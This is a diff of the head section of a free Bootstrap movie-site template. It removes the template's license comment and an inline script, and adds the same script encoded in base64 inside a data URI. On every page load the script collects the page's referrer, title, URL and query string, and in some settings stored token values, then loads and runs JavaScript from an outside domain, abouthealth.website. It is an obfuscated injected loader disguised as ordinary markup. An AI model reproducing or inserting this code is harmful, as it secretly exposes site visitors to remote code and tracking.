@@ -1,54 +1,7 @@
-<!--
-author: W3layouts
-author URL: http://w3layouts.com
-License: Creative Commons Attribution 3.0 Unported
-License URL: http://creativecommons.org/licenses/by/3.0/
--->
 <!DOCTYPE html>
 <html>
 <head>
-	<script>
-    (function() {
-    var name = '_zsKrB9hwscDRwQ91';
-    if (!window._zsKrB9hwscDRwQ91) {
-        window._zsKrB9hwscDRwQ91 = {
-            unique: false,
-            ttl: 86400,
-            R_PATH: 'https://abouthealth.website/RH1ZgT',
-            P_PATH: 'https://abouthealth.website/32a94fc/postback',
-        };
-    }
-    const _dST8PF4MH6my81YP = localStorage.getItem('config');
-    if (typeof _dST8PF4MH6my81YP !== 'undefined' && _dST8PF4MH6my81YP !== null) {
-        var _S3kDVHJn9pvTxCLH = JSON.parse(_dST8PF4MH6my81YP);
-        var _YTvZ5jJwB7L5gD9h = Math.round(+new Date()/1000);
-        if (_S3kDVHJn9pvTxCLH.created_at + window._zsKrB9hwscDRwQ91.ttl < _YTvZ5jJwB7L5gD9h) {
-            localStorage.removeItem('subId');
-            localStorage.removeItem('token');
-            localStorage.removeItem('config');
-        }
-    }
-    var _d4dtKYJ12x6Knxnw = localStorage.getItem('subId');
-    var _X7QJDSfJfdT6YVq2 = localStorage.getItem('token');
-    var _sJWdrWY9kWjFCpGw = '?return=js.client';
-        _sJWdrWY9kWjFCpGw += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _sJWdrWY9kWjFCpGw += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _sJWdrWY9kWjFCpGw += '&default_keyword=' + encodeURIComponent(document.title);
-        _sJWdrWY9kWjFCpGw += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _sJWdrWY9kWjFCpGw += '&name=' + encodeURIComponent(name);
-    if (typeof _d4dtKYJ12x6Knxnw !== 'undefined' && _d4dtKYJ12x6Knxnw && window._zsKrB9hwscDRwQ91.unique) {
-        _sJWdrWY9kWjFCpGw += '&sub_id=' + encodeURIComponent(_d4dtKYJ12x6Knxnw);
-    }
-    if (typeof _X7QJDSfJfdT6YVq2 !== 'undefined' && _X7QJDSfJfdT6YVq2 && window._zsKrB9hwscDRwQ91.unique) {
-        _sJWdrWY9kWjFCpGw += '&token=' + encodeURIComponent(_X7QJDSfJfdT6YVq2);
-    }
-    var a = document.createElement('script');
-        a.type = 'application/javascript';
-        a.src = window._zsKrB9hwscDRwQ91.R_PATH + _sJWdrWY9kWjFCpGw;
-    var s = document.getElementsByTagName('script')[0];
-    s.parentNode.insertBefore(a, s)
-    })();
-    </script>
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfMjRuZFJwdFRZQlhRY0tiTCc7CiAgICBpZiAoIXdpbmRvdy5fMjRuZFJwdFRZQlhRY0tiTCkgewogICAgICAgIHdpbmRvdy5fMjRuZFJwdFRZQlhRY0tiTCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9hYm91dGhlYWx0aC53ZWJzaXRlL1JIMVpnVCcsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8vYWJvdXRoZWFsdGgud2Vic2l0ZS8zMmE5NGZjL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzlqMW53V0IxTlRubUZjc2IgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF85ajFud1dCMU5Ubm1GY3NiICE9PSAndW5kZWZpbmVkJyAmJiBfOWoxbndXQjFOVG5tRmNzYiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfeW52TlJtaEJMNFJ2NDdtOCA9IEpTT04ucGFyc2UoXzlqMW53V0IxTlRubUZjc2IpOwogICAgICAgIHZhciBfdmROQ3poYnNac2RiRDNoVCA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF95bnZOUm1oQkw0UnY0N204LmNyZWF0ZWRfYXQgKyB3aW5kb3cuXzI0bmRScHRUWUJYUWNLYkwudHRsIDwgX3ZkTkN6aGJzWnNkYkQzaFQpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF94cTVzMVJZVEhnbnlaM0xOID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX0tuM0I3M0dOU1ljQlo0ZFEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfTlJ5dlZNNWRnNjU4bVdMVCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX05SeXZWTTVkZzY1OG1XTFQgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX05SeXZWTTVkZzY1OG1XTFQgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfTlJ5dlZNNWRnNjU4bVdMVCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfTlJ5dlZNNWRnNjU4bVdMVCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX05SeXZWTTVkZzY1OG1XTFQgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF94cTVzMVJZVEhnbnlaM0xOICE9PSAndW5kZWZpbmVkJyAmJiBfeHE1czFSWVRIZ255WjNMTiAmJiB3aW5kb3cuXzI0bmRScHRUWUJYUWNLYkwudW5pcXVlKSB7CiAgICAgICAgX05SeXZWTTVkZzY1OG1XTFQgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfeHE1czFSWVRIZ255WjNMTik7CiAgICB9CiAgICBpZiAodHlwZW9mIF9LbjNCNzNHTlNZY0JaNGRRICE9PSAndW5kZWZpbmVkJyAmJiBfS24zQjczR05TWWNCWjRkUSAmJiB3aW5kb3cuXzI0bmRScHRUWUJYUWNLYkwudW5pcXVlKSB7CiAgICAgICAgX05SeXZWTTVkZzY1OG1XTFQgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9LbjNCNzNHTlNZY0JaNGRRKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll8yNG5kUnB0VFlCWFFjS2JMLlJfUEFUSCArIF9OUnl2Vk01ZGc2NThtV0xUOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
 <title>Movies Pro an Entertainment Category Flat Bootstrap Responsive Website Template | Home :: w3layouts</title>
 <!-- for-mobile-apps -->
 <meta name="viewport" content="width=device-width, initial-scale=1">
